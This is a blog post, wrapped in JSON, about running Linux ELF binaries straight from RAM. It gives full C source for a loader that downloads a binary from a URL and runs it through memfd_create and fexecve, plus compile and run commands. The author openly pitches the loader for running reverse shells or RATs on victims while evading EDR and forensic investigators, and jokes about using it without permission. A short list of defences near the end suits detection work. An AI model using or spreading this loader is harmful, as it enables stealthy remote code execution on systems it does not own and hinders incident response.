[
  {
    "filename": "executing_elf_binary_from_web.md",
    "title": "ELF Execution from RAM",
    "date": "2026-02-25",
    "tag": "LINUX",
    "description": "Loading and executing ELF binaries directly from RAM using memfd_create() and fexecve(). No disk writes, minimal forensic traces.",
    "content": "# ELF Execution from RAM\n\n\n> **Disclaimer:** This article is intended for educational purposes only. The techniques shown below are designed to deepen understanding of ELF execution, in-memory operations, and post-exploitation methodologies on Linux systems. Use responsibly and don’t do dumb things you will regret later.\n\nHello again. Today, i want to talk about a “project” that i was working on these days while i wasn’t posting: a C loader, that loads an ELF binary from the internet, and runs it. It doesn’t get saved to the disk, only in the RAM.\n\n## Why should i use a loader? Can’t i just run the binary on the victim’s system, duh?\n\nWell yes. But let’s create an hypothetical situation:\n\nYou create a well-made reverse shell, or maybe a RAT and infect a big company. A forensic team starts analyzing the disk(s), so they can see if the virus is still there, saved somewhere. They find a weird, not-signed, binary. They do some reverse-engineering and now they can see it was a RAT (and probably see the hardcoded IP that you probably saved in a constant named “C2\\_SERVER”). From there, they will start to analyze every packet on the network until they find the malicious ones that will let them trace the attack back to you, and it’s pretty much game over.\n\n## Damn. Are there other benefits?\n\nSure. The most important ones are:\n\n* No disk writes = no I/O monitoring\n    \n* Evading basic file-based antivirus/EDR solutions\n    \n* Leaving minimal forensic traces (just like i said before)\n    \n* Fully operational userland execution\n    \n\n## Now i’m interested. How it works?\n\nWe achieve this using Linux's `memfd_create()` and `fexecve()` syscalls.\n\n### `memfd_create()`\n\nCreates an anonymous file in memory (RAM) that behaves like a normal file descriptor, but doesn't touch the disk.\n\n```c\nint memfd_create(const char *name, unsigned int flags);\n```\n\n### `fexecve()`\n\nExecutes a binary from a given file descriptor. Think `execve()`, but for in-memory files.\n\n```c\nint fexecve(int fd, char *const argv[], char *const envp[]);\n```\n\n## Where is the code then?\n\nPosted up on [github](https://github.com/proxydom/nodiskloader). I’ll post it here too.\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <errno.h>\n#include <curl/curl.h>\n#ifndef MFD_CLOEXEC\n#define MFD_CLOEXEC 0x0001\n#endif\n\n// Wrapper for memfd_create syscall\nint memfd_create(const char *name, unsigned int flags) {\n    return syscall(SYS_memfd_create, name, flags);\n}\n// Structure used to store the downloaded ELF in memory\nstruct MemoryBuffer {\n    char *data;     // pointer to the allocated buffer\n    size_t size;    // current size of the buffer\n};\n// libcurl write callback: appends downloaded data to the memory buffer\nsize_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {\n    size_t total = size * nmemb;\n    struct MemoryBuffer *mem = (struct MemoryBuffer *)userdata;\n\n    // Expand buffer size to fit new data\n    char *tmp = realloc(mem->data, mem->size + total);\n    if (!tmp) return 0;\n\n    mem->data = tmp;\n    memcpy(&(mem->data[mem->size]), ptr, total);  // append new chunk\n    mem->size += total;  // update buffer size\n    return total;\n}\n\n// Core function: download ELF binary from URL and execute it directly from RAM\nint load_elf_from_url(const char *url) {\n    CURL *curl = curl_easy_init();  // initialize libcurl\n    if (!curl) return -1;\n\n    struct MemoryBuffer bin = {0};  // initialize empty memory buffer\n\n    // Configure curl with target URL and callback\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bin);\n    CURLcode res = curl_easy_perform(curl);  // perform download\n    curl_easy_cleanup(curl);  // clean up curl handle\n\n    // Check if download succeeded and buffer is not empty\n    if (res != CURLE_OK || bin.size == 0) {\n        fprintf(stderr, \"Failed to download binary.\\n\");\n        free(bin.data);\n        return -1;\n    }\n\n    // Create anonymous file in RAM\n    int memfd = memfd_create(\"inmem\", MFD_CLOEXEC);\n    if (memfd < 0) {\n        perror(\"memfd_create\");\n        free(bin.data);\n        return -1;\n    }\n\n    // Write downloaded ELF content into in-memory file descriptor\n    if (write(memfd, bin.data, bin.size) != bin.size) {\n        perror(\"write to memfd\");\n        free(bin.data);\n        close(memfd);\n        return -1;\n    }\n\n    free(bin.data);  // free download buffer\n\n    // Prepare arguments for fexecve\n    char *argv[] = {\"inmem_exec\", NULL};\n    char *envp[] = {NULL};\n\n    // Execute binary from memory\n    fexecve(memfd, argv, envp);\n\n    // If execution returns, it's an error\n    perror(\"fexecve\");\n    close(memfd);\n    return -1;\n}\n\n// Entry point: expects one argument (URL to ELF binary)\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <url_to_ELF_binary>\\n\", argv[0]);\n        return EXIT_FAILURE;\n    }\n\n    return load_elf_from_url(argv[1]);\n}\n```\n\n## How to Test It?\n\n1. Compile:\n    \n\n```bash\ngcc -o elfloader loader.c -lcurl\n```\n\n2. Upload your ELF binary to a server or file hosting (like transfer.sh, your VPS, or GitHub raw. Ngrok should do the trick too.)\n    \n3. Run:\n    \n\n```bash\n./elfloader https://your-server.com/binary # the output will be the output of the binary you want to run\n```\n\nNo files dropped, no temp files created. Full in-RAM execution.\n\n## Is there something like this for Windows too?\n\nYes, there is. But for now, i think i will just do some modifications on the code (check the TO-DO list on the repo) and then go to Windows 11.\n\n## So, if this happens to me… is it over?\n\nNah, it’s not over. You can still defend yourself from this.\n\nDefending against in-memory execution requires a different mindset compared to traditional file-based detection. Key things you should do:\n\n* **Behavioral monitoring**: Use EDR solutions that detect suspicious syscalls like `memfd_create`, `fexecve`, or anonymous executable memory mappings.\n    \n* **System call auditing**: Enable `auditd` and configure rules for in-memory execution indicators (e.g., processes spawned with no backing file).\n    \n* **AppArmor/SELinux policies**: Restrict the ability of unprivileged binaries to use `fexecve` or load memory-only files.\n    \n* **Outbound HTTP(S) monitoring**: Block or log unexpected curl/wget/HTTP client activity in non-browser processes.\n    \n* **Memory scanning**: Use forensic tools that can dump and inspect memory regions for injected ELF binaries.\n    \n* **Containerization**: Sandbox applications and isolate processes using namespaces and cgroups to minimize attack surface.\n    \n\nDo all this and you will drastically reduce the attack surface.\n\n## Conclusions\n\nRunning ELF binaries straight from RAM is a clean, elegant, and powerful way to operate on Linux with minimal traces. The above technique is simple, yet underused.\n\nIf this helped you, consider following me on [X](https://x.com/proxy_dom) and join the newsletter.\n\nBut most importantly. Don’t be dumb. This is for educational purpose, don’t use this if you don’t have permissions.\n\n(Unless you know how to hide yourself.)\n\nJust kidding."
  }
]